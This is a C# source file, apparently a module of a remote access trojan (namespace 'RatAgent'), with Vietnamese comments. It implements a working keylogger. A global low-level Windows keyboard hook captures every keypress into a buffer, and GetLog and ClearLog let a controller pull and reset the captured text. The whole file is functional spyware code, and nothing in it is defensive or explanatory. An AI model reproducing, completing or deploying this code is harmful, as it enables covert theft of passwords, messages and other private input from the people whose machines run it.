using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Text;

namespace RatAgent
{
    public static class KeyLogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        // Dùng StringBuilder cho hiệu năng tốt hơn cộng chuỗi
        private static StringBuilder _logBuffer = new StringBuilder();

        public static bool IsRunning = false;

        public static void Start()
        {
            if (_hookID == IntPtr.Zero)
            {
                _hookID = SetHook(_proc);
                IsRunning = true;
            }
        }

        public static void Stop()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
                IsRunning = false;
            }
        }

        public static string GetLog()
        {
            return _logBuffer.ToString();
        }

        public static void ClearLog()
        {
            _logBuffer.Clear();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();

                // Xử lý hiển thị phím cho dễ nhìn
                if (key.Length == 1)
                {
                    // Nếu là chữ cái/số thường
                    if (Control.IsKeyLocked(Keys.CapsLock))
                        _logBuffer.Append(key.ToUpper());
                    else
                        _logBuffer.Append(key.ToLower());
                }
                else
                {
                    // Các phím chức năng
                    switch (key)
                    {
                        case "Space": _logBuffer.Append(" "); break;
                        case "Return": _logBuffer.Append("[Enter]\n"); break;
                        case "Back": _logBuffer.Append("[Back]"); break;
                        case "Tab": _logBuffer.Append("[Tab]"); break;
                        case "LShiftKey":
                        case "RShiftKey":
                        case "LControlKey":
                        case "RControlKey": break; // Bỏ qua shift/ctrl lẻ
                        default: _logBuffer.Append($"[{key}]"); break;
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}